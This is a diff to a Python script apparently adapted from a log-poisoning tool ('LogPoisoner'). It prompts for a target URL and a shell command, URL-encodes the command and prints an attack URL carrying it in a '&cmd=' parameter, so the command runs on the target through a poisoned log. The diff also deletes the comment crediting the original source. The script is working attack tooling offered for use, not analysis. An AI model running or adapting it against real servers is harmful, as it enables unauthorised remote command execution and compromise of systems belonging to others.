@@ -1,8 +1,7 @@
 #!/usr/bin/python3
-# Taken and modified from https://github.com/nickpupp0/LogPoisoner/blob/main/logpoisoner.py
-# run via python3 logpoisoner.py and enter the logpoisoner url when requested.
 import requests
-                                                                         
+import urllib.parse
+
 print("                                                       /%")                   
 print("                                                     *&&@@&#")                  
 print("                                                    @@@@@@@@@&")                
@@ -50,6 +49,7 @@ newHeaders = {
 
 cmd=input("Enter a command:")
 print(f" You entered: {cmd}")
-commandPath=url+f"&cmd={cmd}"
+commandPath=urllib.parse.quote(cmd)
+fullcmd=f"&cmd={commandPath}"
 print("[+] Try the path below to get the output output of your command. It is best to view in source-code:\n")
-print(commandPath)
+print(url+fullcmd)
